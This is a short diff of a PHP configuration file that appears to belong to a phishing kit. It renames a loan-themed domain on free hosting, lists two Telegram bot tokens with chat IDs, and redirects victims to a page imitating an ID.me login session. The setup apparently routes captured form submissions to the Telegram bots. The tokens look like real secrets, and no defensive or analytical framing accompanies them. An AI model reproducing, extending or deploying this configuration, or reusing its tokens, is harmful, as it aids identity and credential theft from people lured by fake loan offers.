@@ -33,12 +33,12 @@ $site_map = [
     ],
 
 
-    'credibleloans.42web.io' => [
+    'credibleloan.42web.io' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8716516943:AAGW8BoxYb7J34yA8truv9rCfM1rvdWYuiQ', 'chat_id' => '7373435774']
         ],
-        'redirect' => 'https://credibleloans.42web.io/api.id.me/en/session/new.html'
+        'redirect' => 'https://credibleloan.42web.io/api.id.me/en/session/new.html'
     ],
 
 
@@ -1080,6 +1080,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     exit;
 }
 ?>
+
 
 
 
